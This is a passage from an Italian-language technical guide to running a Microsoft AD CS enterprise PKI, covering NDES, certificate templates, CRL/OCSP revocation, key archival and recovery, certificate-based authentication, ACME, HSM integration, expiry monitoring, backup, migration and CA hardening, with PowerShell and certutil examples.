# Aggiungere ai gruppi necessari
Add-ADGroupMember -Identity "IIS_IUSRS" -Members "svc-NDES"

# Installare NDES
Install-WindowsFeature ADCS-Device-Enrollment -IncludeManagementTools

Install-AdcsNetworkDeviceEnrollmentService `
    -ServiceAccountName "CORP\svc-NDES" `
    -ServiceAccountPassword (Read-Host -AsSecureString "Password") `
    -RAName "NDES RA" `
    -RAEmail "ndes-admin@corp.contoso.com" `
    -RACompany "Contoso" `
    -Force

# URL NDES:
# http://ndes-server.corp.contoso.com/certsrv/mscep/mscep.dll
# http://ndes-server.corp.contoso.com/certsrv/mscep_admin/

# Il client SCEP usa una One-Time Password (challenge) per l'enrollment:
# 1. Admin genera il challenge su http://ndes-server/certsrv/mscep_admin/
# 2. Il challenge viene configurato sul dispositivo
# 3. Il dispositivo invia il CSR con il challenge a NDES
# 4. NDES verifica il challenge e inoltra la richiesta alla CA
# 5. Il certificato viene restituito al dispositivo

# Configurazione per Intune / MDM:
# Intune usa il NDES connector per emettere certificati SCEP ai dispositivi gestiti
# Vedi Modulo 26 (Intune) per la configurazione del SCEP profile
```

---

## Tipi di Certificato

### SSL/TLS (Server Authentication)

```
Uso: Protezione delle comunicazioni HTTPS per web server, Exchange, RDS, ecc.

EKU: Server Authentication (1.3.6.1.5.5.7.3.1)
Key Usage: Digital Signature, Key Encipherment
Subject: CN=fqdn del server
SAN: tutti i nomi DNS del servizio (incluso wildcard *.corp.contoso.com)
Key Size: RSA 2048+ o ECDSA P-256
Validity: 1-2 anni (1 anno raccomandato per conformità)
Key Archival: No (ricreare in caso di compromissione)
```

### Code Signing (Firma del Codice)

```
Uso: Firma di script PowerShell, eseguibili, driver, pacchetti MSIX.

EKU: Code Signing (1.3.6.1.5.5.7.3.3)
Key Usage: Digital Signature
Subject: CN=nome dello sviluppatore o team
Key Size: RSA 4096
Validity: 3 anni (con timestamp, la firma rimane valida dopo la scadenza)
Approvazione: Manager CA (obbligatoria)
Key Archival: No
Distribuzione: Manuale, solo a sviluppatori autorizzati

Uso con PowerShell:
Set-AuthenticodeSignature -FilePath .\script.ps1 `
    -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)
```

### S/MIME (Secure Email)

```
Uso: Firma e cifratura email in Outlook, Thunderbird, mobile client.

EKU: Secure Email (1.3.6.1.5.5.7.3.4)
Key Usage: Digital Signature, Key Encipherment, Data Encipherment
Subject: CN=nome utente, E=email@corp.contoso.com
SAN: rfc822Name=email@corp.contoso.com
Key Size: RSA 2048
Validity: 2 anni
Key Archival: Sì (CRITICO per la chiave di cifratura — senza KRA,
              email cifrate diventano irrecuperabili se la chiave è persa)
Auto-enrollment: Sì
```

### Client Authentication

```
Uso: Autenticazione utente/computer per VPN, Wi-Fi 802.1X,
     DirectAccess, RADIUS, mutual TLS.

EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
Key Usage: Digital Signature
Subject: Build from AD (UPN per utenti, FQDN per computer)
Key Size: RSA 2048
Validity: 1 anno
Auto-enrollment: Sì
Key Archival: No
```

### Smart Card Logon

```
Uso: Autenticazione forte a due fattori con smart card fisica o virtuale.

EKU: Smart Card Logon (1.3.6.1.5.5.7.3.4), Client Authentication
Key Usage: Digital Signature, Key Encipherment
Subject: Build from AD (UPN obbligatorio nel SAN)
CSP: Microsoft Base Smart Card Crypto Provider
Key Size: RSA 2048
Validity: 1 anno
Auto-enrollment: Opzionale (dipende dal workflow di provisioning smart card)
Requisiti aggiuntivi:
├── DC deve avere certificato Domain Controller Authentication
├── CRL e OCSP devono essere raggiungibili dal DC
└── Account utente deve avere UPN e certificato mappato
```

### EFS (Encrypting File System)

```
Uso: Cifratura file e cartelle su disco (NTFS).

EKU: Encrypting File System (1.3.6.1.4.1.311.10.3.4)
Key Usage: Key Encipherment
Subject: Build from AD
Key Size: RSA 2048
Validity: 2 anni
Key Archival: Sì (CRITICO — senza backup, i file cifrati sono irrecuperabili)
Auto-enrollment: Sì
Recovery Agent: Configurare almeno un EFS Recovery Agent (DRA)
```

### Certificato Domain Controller

```
Uso: Autenticazione dei DC, LDAPS, replica sicura.

Template: Kerberos Authentication (preferito) o Domain Controller Authentication
EKU: KDC Authentication, Smart Card Logon, Client Auth, Server Auth
Subject: Build from AD
SAN: DNS del DC, GUID del DC, DNS del dominio
Auto-enrollment: Sì (i DC devono avere sempre certificati validi)
Validità: 1 anno
IMPORTANTE: senza questo certificato, LDAPS e smart card logon non funzionano
```

---

## Revoca — CRL e OCSP

### CRL (Certificate Revocation List)

```powershell
# La CRL è una lista firmata dalla CA contenente i serial number
# dei certificati revocati. I client la scaricano e la verificano localmente.

# Tipi di CRL:
# - Base CRL: lista completa di tutti i certificati revocati
# - Delta CRL: lista incrementale (solo le revoche dall'ultima base CRL)
#              Riduce significativamente la banda e i tempi di download

# Pubblicare CRL manualmente
certutil -CRL

# Visualizzare CRL corrente
certutil -dump "C:\Windows\System32\CertSrv\CertEnroll\Corp-Issuing-CA.crl"

# Verificare CRL da URL
certutil -URL http://pki.corp.contoso.com/CertEnroll/Corp-Issuing-CA.crl

# Configurare periodo CRL
certutil -setreg CA\CRLPeriod Days
certutil -setreg CA\CRLPeriodUnits 7        # Base CRL ogni 7 giorni
certutil -setreg CA\CRLDeltaPeriod Days
certutil -setreg CA\CRLDeltaPeriodUnits 1    # Delta CRL ogni giorno
certutil -setreg CA\CRLOverlapPeriod Days
certutil -setreg CA\CRLOverlapUnits 3        # Overlap di 3 giorni

# Riavviare dopo le modifiche
Restart-Service CertSvc
certutil -CRL  # Pubblica nuova CRL con i nuovi parametri
```

### CRL Distribution Points (CDP)

```powershell
# Il CDP definisce DOVE i client trovano la CRL.
# Il certificato contiene l'URL del CDP nell'estensione "CRL Distribution Points".

# Tipi di CDP:
# 1. LDAP://  → AD-integrated, funziona solo per client nel dominio
# 2. HTTP://  → Universale, funziona per client interni ed esterni
# 3. FILE://  → Path UNC, solo per pubblicazione (non per download client)

# Configurazione consigliata:
# - HTTP come CDP primario (raggiungibile da tutti)
# - LDAP come CDP secondario (per client interni)
# - Non usare FILE come CDP client (solo per publishing)

# Configurare CDP in certsrv.msc:
# 1. Tasto destro sulla CA → Properties → Extensions → CRL Distribution Point
# 2. Rimuovere CDP di default non necessari
# 3. Aggiungere:
#    http://pki.corp.contoso.com/CertEnroll/<CaName><CRLNameSuffix><DeltaCRLAllowed>.crl
#    ├── Include in CRLs: Sì
#    ├── Include in CDP extension: Sì
#    └── Include in Delta CRL extension: Sì
# 4. Mantenere il path locale per la pubblicazione:
#    C:\Windows\System32\CertSrv\CertEnroll\%3%8%9.crl
#    ├── Publish CRLs to this location: Sì
#    └── Publish Delta CRLs: Sì

# Pubblicare CRL su web server (se diverso dalla CA)
# Configurare IIS con virtual directory che punta alla share di pubblicazione
# Assicurarsi che i permessi consentano lettura anonima
```

### Authority Information Access (AIA)

```powershell
# L'AIA definisce DOVE i client trovano:
# 1. Il certificato della CA (per costruire la catena)
# 2. L'URL dell'OCSP responder

# Configurazione AIA in certsrv.msc:
# CA Properties → Extensions → Authority Information Access
# Aggiungere:
# http://pki.corp.contoso.com/CertEnroll/<ServerDNSName>_<CaName><CertificateName>.crt
#   → Include in AIA extension: Sì
# http://ocsp.corp.contoso.com/ocsp
#   → Include in OCSP extension: Sì
```

### OCSP Responder

```powershell
# OCSP fornisce verifica dello stato di revoca in tempo reale.
# Vantaggi rispetto a CRL:
# - Risposta immediata (non serve scaricare tutta la CRL)
# - Minor carico di banda
# - Status più aggiornato (non dipende dal periodo di pubblicazione CRL)

# Installare Online Responder
Install-WindowsFeature ADCS-Online-Cert -IncludeManagementTools
Install-AdcsOnlineResponder -Force

# Configurazione:
# 1. Emettere certificato "OCSP Response Signing" per il server OCSP
#    (template dedicato, auto-enrollment per il computer OCSP)
#    Il template OCSP Response Signing deve avere:
#    - EKU: OCSP Signing (1.3.6.1.5.5.7.3.9)
#    - id-pkix-ocsp-nocheck extension (nessuna verifica di revoca sul cert OCSP)
#    - Permesso Enroll per il computer OCSP

# 2. Configurare Revocation Configuration in ocsp.msc:
#    a. Action → Add Revocation Configuration
#    b. Selezionare la CA
#    c. Auto-select signing certificate: Sì
#    d. Auto-enroll for OCSP signing certificate: Sì
#    e. Refresh CRL based on: CA CRL period

# 3. Configurare AIA sulla CA per includere URL OCSP (già fatto sopra)

# 4. Riavviare servizi
Restart-Service CertSvc
iisreset

# Verificare OCSP
certutil -verify -urlfetch webapp.cer
# Cercare "OCSP" nell'output — deve mostrare status "ok" o "revoked"

# Test OCSP con URL specifico
certutil -config "CA-SERVER\Corp-Issuing-CA" -ping
```

### Revocare un Certificato

```powershell
# Motivi di revoca (RFC 5280):
# 0 = Unspecified
# 1 = Key Compromise (chiave privata compromessa)
# 2 = CA Compromise
# 3 = Affiliation Changed (cambio di ruolo/organizzazione)
# 4 = Superseded (sostituito da un nuovo certificato)
# 5 = Cessation of Operation (servizio dismesso)

# Revocare per serial number
certutil -revoke <SerialNumber> 1  # 1 = Key Compromise

# Revocare e specificare la data di compromissione
certutil -revoke <SerialNumber> 1 "01/15/2026 10:30"

# Dopo la revoca, pubblicare nuova CRL
certutil -CRL

# Verificare che il certificato risulti revocato
certutil -verify revoked-cert.cer
# Output atteso: "CERT_TRUST_IS_REVOKED"
```

---

## Key Archival e Recovery

### Configurazione Key Archival

```powershell
# Il Key Archival consente alla CA di archiviare una copia della chiave privata
# del richiedente nel database CA, cifrata con la chiave del KRA.
# ESSENZIALE per certificati di cifratura (S/MIME, EFS):
# senza key archival, se l'utente perde il profilo, i dati cifrati sono persi.

# 1. Designare un Key Recovery Agent (KRA)
# Un KRA è un utente con un certificato "Key Recovery Agent"

# Richiedere certificato KRA:
# certmgr.msc → Personal → Request New Certificate → Key Recovery Agent
# (richiede approvazione del CA Manager)

# Approvare la richiesta sulla CA:
# certsrv.msc → Pending Requests → tasto destro → Issue

# 2. Configurare la CA per il Key Archival
# certsrv.msc → CA Properties → Recovery Agents
#   → Archive the key: selezionare
#   → Number of recovery agents: 1 (o più per alta sicurezza)
#   → Aggiungere il certificato KRA

# Riavviare il servizio CA
Restart-Service CertSvc

# 3. Abilitare key archival sul template
# certtmpl.msc → template → Properties → Request Handling
#   → Archive subject's encryption private key: Checked

# Verificare che il key archival sia attivo
certutil -getreg CA\KRAFlags
certutil -getreg CA\KRACertCount
```

### Recupero Chiave Privata

```powershell
# Scenario: un utente ha perso il profilo e non riesce a leggere le email cifrate.
# Il KRA può recuperare la chiave privata dal database CA.

# 1. Trovare il serial number del certificato
certutil -view -restrict "RequesterName=CORP\jsmith,Disposition=20" `
    -out "SerialNumber,CommonName,NotAfter,CertificateTemplate"

# 2. Recuperare il BLOB della chiave archiviata
certutil -getkey <SerialNumber> outputblob.pfx

# 3. Decifrare il BLOB con il certificato KRA
certutil -recoverkey outputblob.pfx recovered.pfx
# (richiede la chiave privata del KRA — il KRA deve eseguire questo comando)

# 4. Importare il certificato recuperato nello store dell'utente
Import-PfxCertificate -FilePath recovered.pfx `
    -CertStoreLocation Cert:\CurrentUser\My `
    -Password (Read-Host -AsSecureString "Password PFX")

# 5. Eliminare i file temporanei in modo sicuro
Remove-Item outputblob.pfx, recovered.pfx -Force

# NOTA: il processo di recovery deve essere documentato e auditato.
# Configurare auditing sulla CA:
# certsrv.msc → CA Properties → Auditing
#   → Issue and manage certificate requests: Checked
#   → Backup and restore the CA database: Checked
```

---

## Autenticazione Basata su Certificati

### Smart Card

```
Componenti necessari per smart card logon:

1. Smart Card fisica (o virtuale)
   ├── PIV (Personal Identity Verification) — standard federale USA
   ├── PKCS#11 — interfaccia standard cross-platform
   └── Microsoft Base Smart Card CSP — integrazione Windows nativa

2. Certificato Smart Card Logon
   ├── EKU: Smart Card Logon + Client Authentication
   ├── UPN nel SAN (obbligatorio per Kerberos)
   └── Emesso dalla PKI enterprise

3. Infrastruttura
   ├── Domain Controller con certificato (Kerberos Authentication template)
   ├── CRL e OCSP raggiungibili dai DC
   ├── Card reader su ogni workstation
   └── Minidriver per la smart card installato

Flusso di autenticazione:
1. L'utente inserisce la smart card
2. Windows mostra il prompt PIN
3. L'utente inserisce il PIN
4. La smart card firma il challenge Kerberos con la chiave privata
5. Il DC verifica la firma con la chiave pubblica dal certificato
6. Il DC verifica che il certificato sia valido (catena, revoca, scadenza)
7. Il DC mappa il certificato all'account AD (tramite UPN nel SAN)
8. Il DC emette il TGT Kerberos
```

### Windows Hello for Business (WHfB)

```
WHfB usa certificati o chiavi legate al TPM per autenticazione passwordless.

Deployment models:
├── Key Trust: chiave asimmetrica legata al TPM, nessun certificato user
│   ├── Più semplice da deployare
│   ├── Non richiede PKI per i certificati utente
│   └── Richiede Windows Server 2016+ DC e Azure AD
│
├── Certificate Trust: certificato emesso dalla PKI enterprise
│   ├── Supporto per RDP e altri scenari legacy che richiedono certificato
│   ├── Richiede PKI enterprise con auto-enrollment
│   └── Template dedicato WHfB che include Smart Card Logon EKU
│
└── Cloud Kerberos Trust: chiavi cloud-based, nessun certificato
    ├── Il più moderno, richiede Azure AD Kerberos
    └── Non richiede PKI

Configurazione Certificate Trust:
1. Template: duplicare "Smartcard Logon"
   ├── Cryptography: KSP, 2048-bit RSA
   ├── Subject: Build from AD (UPN nel SAN)
   ├── Issuance: richiede firma del certificato enrollment agent
   └── Security: Autoenroll per il gruppo WHfB Users

2. GPO:
   Computer → Administrative Templates → Windows Components →
     Windows Hello for Business
     → Use Windows Hello for Business: Enabled
     → Use certificate for on-premises authentication: Enabled

3. AD FS (per hybrid):
   Configurare certificate registration authority su AD FS
```

### Certificate Mapping in AD

```powershell
# Il certificate mapping lega un certificato a un account AD.
# Necessario per autenticazione con smart card e client certificate.

# Mapping implicito (automatico):
# Il DC cerca un account AD con UPN che corrisponde al SAN del certificato.
# Funziona se il certificato ha UPN nel SAN e l'account AD ha lo stesso UPN.

# Mapping esplicito (manuale):
# Aggiungere il certificato all'attributo altSecurityIdentities dell'utente AD.

# Mappare per issuer + serial number
Set-ADUser -Identity jsmith -Replace @{
    altSecurityIdentities = "X509:<I>DC=com,DC=contoso,DC=corp,CN=Corp-Issuing-CA<SR>1234567890"
}

# Mappare per Subject
Set-ADUser -Identity jsmith -Replace @{
    altSecurityIdentities = "X509:<S>CN=John Smith,OU=Users,DC=corp,DC=contoso,DC=com"
}

# Mappare per SHA1 hash del certificato
Set-ADUser -Identity jsmith -Replace @{
    altSecurityIdentities = "X509:<SHA1-PUKEY>abcdef1234567890abcdef1234567890abcdef12"
}

# Verificare mapping
Get-ADUser -Identity jsmith -Properties altSecurityIdentities |
    Select-Object -ExpandProperty altSecurityIdentities

# Verificare che il DC accetti il certificato
certutil -store -user My
```

---

## Let's Encrypt e Protocollo ACME

### ACME Protocol

```
ACME (Automatic Certificate Management Environment) — RFC 8555
Protocollo automatizzato per l'emissione e il rinnovo di certificati DV
da CA pubbliche (Let's Encrypt, ZeroSSL, Buypass, ecc.)

Flusso ACME:
1. Il client genera una coppia di chiavi e un CSR
2. Il client contatta il server ACME e richiede l'emissione
3. Il server ACME presenta una challenge (HTTP-01, DNS-01, TLS-ALPN-01)
4. Il client dimostra il controllo del dominio risolvendo la challenge:
   - HTTP-01: file su http://dominio/.well-known/acme-challenge/TOKEN
   - DNS-01: record TXT _acme-challenge.dominio con valore specifico
   - TLS-ALPN-01: certificato TLS speciale con OID ACME
5. Il server ACME verifica la challenge
6. Se validata, il server ACME emette il certificato
7. Il client installa il certificato e schedula il rinnovo automatico

Limitazioni:
- Solo certificati DV (Domain Validation) — nessun OV o EV
- Validità massima 90 giorni (Let's Encrypt)
- Rate limit: 50 certificati per registered domain per settimana
- Non sostituisce la PKI interna per certificati enterprise
```

### win-acme (WACS) per IIS

```powershell
# win-acme è il client ACME più popolare per Windows/IIS
# GitHub: https://github.com/win-acme/win-acme

# Download e installazione
# Scaricare l'ultima release da GitHub e estrarre in C:\Tools\win-acme

# Esecuzione interattiva (prima volta)
C:\Tools\win-acme\wacs.exe

# Menu:
# N - Create certificate (default settings)
# M - Create certificate (full options)
# R - Run renewals
# A - Manage renewals
# O - More options

# Emissione automatica per un sito IIS
C:\Tools\win-acme\wacs.exe --target iis `
    --siteid 1 `
    --installation iis `
    --store certificatestore

# Emissione con SAN multipli
C:\Tools\win-acme\wacs.exe --target manual `
    --host "www.contoso.com,api.contoso.com,mail.contoso.com" `
    --validation selfhosting `
    --store certificatestore `
    --installation iis --siteid 1

# Emissione con DNS validation (per wildcard)
C:\Tools\win-acme\wacs.exe --target manual `
    --host "*.contoso.com" `
    --validation dns-01 `
    --validationmode dns-01.script `
    --dnscreatescript "C:\Tools\dns-create.ps1" `
    --dnsdeletescript "C:\Tools\dns-delete.ps1"

# Rinnovo automatico (task schedulato creato automaticamente da WACS)
# Il task schedulato esegue: wacs.exe --renew --baseuri https://acme-v02.api.letsencrypt.org/
# Default: esecuzione giornaliera, rinnova i certificati a 55+ giorni dalla scadenza

# Verificare stato rinnovi
C:\Tools\win-acme\wacs.exe --list --baseuri https://acme-v02.api.letsencrypt.org/
```

### Integrazione ACME con CA Interna (AD CS)

```powershell
# Da Windows Server 2025, AD CS supporta nativamente il protocollo ACME
# per l'emissione automatizzata di certificati interni.
# Questo consente ai servizi interni di usare lo stesso workflow ACME
# di Let's Encrypt, ma con certificati firmati dalla CA enterprise.

# Per versioni precedenti, soluzioni di terze parti:
# - Certify The Web (certifytheweb.com) con CA interne
# - step-ca (smallstep) come intermediaria ACME
# - EJBCA con supporto ACME

# In ogni caso, per servizi interni usare la PKI enterprise.
# ACME/Let's Encrypt è indicato SOLO per servizi pubblici (siti web, API esterne).
```

---

## Integrazione HSM

### Hardware Security Module

```
Un HSM è un dispositivo hardware dedicato alla protezione delle chiavi crittografiche.
Garantisce che la chiave privata non lasci MAI il dispositivo.

Vantaggi:
├── Chiave privata non estraibile dal hardware
├── Protezione contro furto, copia, memory dump
├── Generazione di chiavi con entropia hardware (TRNG)
├── Performance crittografica elevata (accelerazione hardware)
├── Conformità normativa (FIPS 140-2 Level 3, Common Criteria)
└── Audit trail hardware di ogni operazione sulla chiave

Casi d'uso nella PKI:
├── Protezione della chiave privata della Root CA (RACCOMANDATO)
├── Protezione della chiave privata della Issuing CA
├── Protezione delle chiavi dei certificati TLS ad alta sicurezza
└── Protezione delle chiavi di firma del codice

Produttori principali:
├── Thales (ex Gemalto/SafeNet) — Luna HSM
├── Entrust nShield
├── Utimaco SecurityServer
├── YubiHSM (per scenari più piccoli)
└── Azure Managed HSM / AWS CloudHSM (cloud-based)
```

### Configurazione CA con HSM

```powershell
# L'integrazione avviene tramite il CSP (Cryptographic Service Provider)
# o KSP (Key Storage Provider) fornito dal vendor HSM.

# 1. Installare il software del vendor HSM sul server CA
# 2. Configurare la partizione/slot HSM e l'autenticazione
# 3. Verificare che il KSP sia registrato
certutil -csplist
# Cercare il provider del vendor (es. "SafeNet Key Storage Provider")

# 4. Durante l'installazione della CA, specificare il KSP dell'HSM
Install-AdcsCertificationAuthority -CAType StandaloneRootCA `
    -CACommonName "Corp-Root-CA" `
    -KeyLength 4096 `
    -HashAlgorithmName SHA256 `
    -CryptoProviderName "SafeNet Key Storage Provider" `
    -Force

# La chiave privata della CA viene generata e custodita nell'HSM.
# Tutte le operazioni di firma avvengono all'interno del dispositivo.

# Per migrare una CA esistente a HSM:
# 1. Backup del database CA e della chiave privata
# 2. Installare il software HSM
# 3. Importare la chiave privata nell'HSM tramite il tool del vendor
# 4. Riconfigurare la CA per usare il KSP dell'HSM
# 5. Verificare con certutil -store My

# Per ambienti senza budget HSM dedicato:
# - YubiHSM 2 (circa $650): adeguato per Root CA offline
# - Azure Managed HSM: per Issuing CA in cloud/hybrid
# - TPM (Trusted Platform Module): presente in ogni server moderno,
#   usabile come KSP ma con limitazioni rispetto a un HSM dedicato
```

---

## Monitoraggio Certificati

### Script di Inventario Certificati

```powershell
# Inventario di tutti i certificati emessi dalla CA
certutil -view -restrict "Disposition=20" `
    -out "SerialNumber,CommonName,NotBefore,NotAfter,CertificateTemplate,RequesterName" |
    Out-File C:\Reports\cert-inventory.txt

# Certificati in scadenza nei prossimi 30 giorni
$daysAhead = 30
$expiringSoon = certutil -view `
    -restrict "NotAfter<=$((Get-Date).AddDays($daysAhead).ToString('MM/dd/yyyy')),NotAfter>=$((Get-Date).ToString('MM/dd/yyyy')),Disposition=20" `
    -out "CommonName,NotAfter,CertificateTemplate,RequesterName"

# Script PowerShell per report scadenze
function Get-ExpiringCertificates {
    param(
        [int]$DaysAhead = 30,
        [string]$CertStore = "Cert:\LocalMachine\My"
    )

    Get-ChildItem $CertStore | Where-Object {
        $_.NotAfter -lt (Get-Date).AddDays($DaysAhead) -and
        $_.NotAfter -gt (Get-Date)
    } | Select-Object @{N='Subject';E={$_.Subject}},
        @{N='Thumbprint';E={$_.Thumbprint}},
        @{N='Expires';E={$_.NotAfter.ToString('yyyy-MM-dd')}},
        @{N='DaysLeft';E={($_.NotAfter - (Get-Date)).Days}},
        @{N='Issuer';E={$_.Issuer}},
        @{N='Template';E={
            ($_.Extensions | Where-Object {
                $_.Oid.Value -eq '1.3.6.1.4.1.311.21.7'
            }).Format($false)
        }} |
    Sort-Object DaysLeft
}

# Esecuzione
Get-ExpiringCertificates -DaysAhead 60 | Format-Table -AutoSize
```

### Alert Automatici

```powershell
# Script per invio alert email sui certificati in scadenza
# Da schedulare come Task Schedulato (giornaliero)

$smtpServer = "smtp.corp.contoso.com"
$from = "pki-alerts@corp.contoso.com"
$to = "it-security@corp.contoso.com"
$daysWarning = 30

# Controllare più store
$stores = @(
    "Cert:\LocalMachine\My",
    "Cert:\LocalMachine\WebHosting"
)

$expiring = foreach ($store in $stores) {
    Get-ChildItem $store | Where-Object {
        $_.NotAfter -lt (Get-Date).AddDays($daysWarning) -and
        $_.NotAfter -gt (Get-Date)
    } | Select-Object Subject, Thumbprint, NotAfter,
        @{N='Store';E={$store}},
        @{N='DaysLeft';E={($_.NotAfter - (Get-Date)).Days}}
}

if ($expiring) {
    $body = "I seguenti certificati scadranno entro $daysWarning giorni:`n`n"
    $body += $expiring | Format-Table -AutoSize | Out-String

    Send-MailMessage -From $from -To $to `
        -Subject "ALERT PKI: $($expiring.Count) certificati in scadenza" `
        -Body $body -SmtpServer $smtpServer
}

# Registrare come Task Schedulato
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -File C:\Scripts\Check-CertExpiry.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "08:00"
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "PKI-CertExpiryCheck" `
    -Action $action -Trigger $trigger -Principal $principal
```

### Monitoraggio CRL

```powershell
# Verificare che la CRL sia valida e non scaduta
function Test-CRLValidity {
    param([string]$CrlUrl)

    $tempFile = [IO.Path]::GetTempFileName()
    try {
        Invoke-WebRequest -Uri $CrlUrl -OutFile $tempFile -UseBasicParsing
        $output = certutil -dump $tempFile
        $nextUpdate = ($output | Select-String "Next Update:").ToString().Split(":")[1].Trim()
        $nextUpdateDate = [datetime]$nextUpdate

        [PSCustomObject]@{
            URL          = $CrlUrl
            NextUpdate   = $nextUpdateDate
            IsValid      = $nextUpdateDate -gt (Get-Date)
            HoursLeft    = [math]::Round(($nextUpdateDate - (Get-Date)).TotalHours, 1)
        }
    }
    finally {
        Remove-Item $tempFile -ErrorAction SilentlyContinue
    }
}

# Verificare CRL della Issuing CA
Test-CRLValidity -CrlUrl "http://pki.corp.contoso.com/CertEnroll/Corp-Issuing-CA.crl"

# Verificare CRL della Root CA
Test-CRLValidity -CrlUrl "http://pki.corp.contoso.com/CertEnroll/Corp-Root-CA.crl"
```

---

## Migrazione e Disaster Recovery

### Backup della CA

```powershell
# BACKUP REGOLARE È OBBLIGATORIO.
# Senza backup, la perdita della CA significa perdita dell'intera PKI.

# Backup completo (database + chiave privata)
$backupPath = "E:\CABackup\$(Get-Date -Format 'yyyy-MM-dd')"
New-Item -ItemType Directory -Path $backupPath -Force

# Backup database CA
Backup-CARoleService -Path $backupPath -DatabaseOnly

# Backup chiave privata CA (richiede password)
Backup-CARoleService -Path $backupPath -KeyOnly `
    -Password (Read-Host -AsSecureString "Password backup chiave CA")

# Backup completo (database + chiave)
Backup-CARoleService -Path $backupPath `
    -Password (Read-Host -AsSecureString "Password backup")

# Via certutil (alternativa)
certutil -backupDB $backupPath
certutil -backupKey $backupPath

# Backup della configurazione del registry CA
reg export "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc" `
    "$backupPath\CertSvc-Registry.reg"

# Backup dei template personalizzati (sono in AD, ma è buona prassi)
# I template sono oggetti AD — backup tramite AD backup o export LDIF

# Backup della configurazione IIS (se web enrollment attivo)
# C:\Windows\System32\inetsrv\appcmd.exe list config > "$backupPath\iis-config.xml"

# IMPORTANTE: conservare il backup OFFLINE e crittografato
# La chiave privata della CA nel backup è il target #1 di un attaccante
```

### Ripristino della CA

```powershell
# Scenario: il server CA è perso e deve essere ricostruito

# 1. Installare Windows Server con stesso hostname e IP (se possibile)
# 2. Joinare al dominio
# 3. Installare il ruolo CA (NON configurare — solo installare il binario)
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

# 4. Ripristinare la chiave privata
certutil -restoreKey "E:\CABackup\2026-01-15"
# (richiede la password usata durante il backup)

# 5. Installare la CA con la stessa configurazione
Install-AdcsCertificationAuthority -CAType EnterpriseSubordinateCA `
    -CACommonName "Corp-Issuing-CA" `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -Force

# 6. Ripristinare il database
certutil -restoreDB "E:\CABackup\2026-01-15"

# 7. Ripristinare la configurazione del registry
reg import "E:\CABackup\2026-01-15\CertSvc-Registry.reg"

# 8. Riavviare il servizio
Restart-Service CertSvc

# 9. Verificare
certutil -ping
certutil -CAInfo
certutil -CRL  # Pubblicare CRL aggiornata
```

### Migrazione CA a Nuovo Server

```powershell
# Migrazione della CA da Server A (vecchio) a Server B (nuovo)

# --- Sul Server A (vecchio) ---

# 1. Backup completo
$backupPath = "\\fileserver\CAMigration"
Backup-CARoleService -Path $backupPath `
    -Password (Read-Host -AsSecureString "Password")
reg export "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc" `
    "$backupPath\CertSvc-Registry.reg"

# 2. Esportare configurazione CDP e AIA
certutil -getreg CA\CRLPublicationURLs > "$backupPath\CDP.txt"
certutil -getreg CA\CACertPublicationURLs > "$backupPath\AIA.txt"

# 3. Disinstallare il ruolo CA dal vecchio server
# (questo rimuove l'oggetto CA da AD)
Uninstall-AdcsCertificationAuthority -Force

# --- Sul Server B (nuovo) ---

# 4. Installare il ruolo CA
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

# 5. Ripristinare chiave privata
certutil -restoreKey "$backupPath"

# 6. Configurare la CA (usa la chiave ripristinata)
Install-AdcsCertificationAuthority -CAType EnterpriseSubordinateCA `
    -CACommonName "Corp-Issuing-CA" `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -Force

# 7. Ripristinare database
Restore-CARoleService -Path $backupPath

# 8. Ripristinare configurazione registry
reg import "$backupPath\CertSvc-Registry.reg"

# 9. Riconfigurare CDP e AIA (se il nome server è cambiato)
# Aggiornare gli URL in certsrv.msc → Extensions

# 10. Riavviare e verificare
Restart-Service CertSvc
certutil -ping
certutil -CRL
```

---

## Sicurezza e Hardening della CA

### Hardening della CA

```
Principi di sicurezza per la CA:

Root CA (offline):
├── NON joinata al dominio
├── NON connessa alla rete
├── Disco cifrato con BitLocker
├── Accesso fisico ristretto (cassaforte, due persone)
├── VM su host dedicato senza scheda di rete
├── Log di accesso fisico
├── Chiave privata in HSM (ideale)
└── Avviare SOLO per operazioni pianificate

Issuing CA (online):
├── Installazione minimale (Server Core o Desktop Experience senza ruoli extra)
├── NON usare come DC, file server, web server, o qualsiasi altro ruolo
├── Firewall: solo porte necessarie (RPC, HTTPS per CES/CEP)
├── Antivirus con esclusioni per il database CA
├── Auditing abilitato (vedi sotto)
├── Accesso amministrativo limitato (gruppo CA Admins dedicato)
├── RDP disabilitato se non necessario (usare console VM)
├── Backup regolari della chiave privata e del database
└── Monitoraggio con SIEM/eventlog forwarding
```

### Auditing della CA

```powershell
# Abilitare audit sulla CA
# certsrv.msc → CA Properties → Auditing
# Selezionare TUTTI gli eventi:
# ☑ Back up and restore the CA database
# ☑ Change CA configuration
# ☑ Change CA security settings
# ☑ Issue and manage certificate requests
# ☑ Revoke certificates and publish CRLs
# ☑ Store and retrieve archived keys
# ☑ Start and stop Certificate Services

# Abilitare audit policy di Windows
auditpol /set /category:"Object Access" /subcategory:"Certification Services" /success:enable /failure:enable

# Gli eventi vengono registrati in:
# Event Viewer → Security → Event ID:
# 4886 = Certificate Services received a certificate request
# 4887 = Certificate Services approved a certificate request
# 4888 = Certificate Services denied a certificate request
# 4889 = Certificate Services set the status of a certificate to pending
# 4890 = Certificate Services changed the certificate manager settings
# 4891 = Configuration entry changed in Certificate Services
# 4892 = Property of Certificate Services changed
# 4893 = Certificate Services archived a key
# 4894 = Certificate Services imported and archived a key
# 4895 = Certificate Services published the CA certificate to AD
# 4896 = Certificate Services deleted rows from database
# 4897 = Certificate Services published CRL
# 4898 = Certificate Services loaded a template

# Forwarding eventi al SIEM
# Configurare Windows Event Forwarding (WEF) per inviare gli eventi
# Security della CA al collector centralizzato
```

### Restricted Enrollment Agents

```powershell
# Un Enrollment Agent può richiedere certificati PER CONTO di altri utenti.
# È un privilegio potente: un Enrollment Agent malicious potrebbe emettere
# certificati smart card per qualsiasi utente, inclusi Domain Admins.

# Restringere chi l'Enrollment Agent può impersonare:
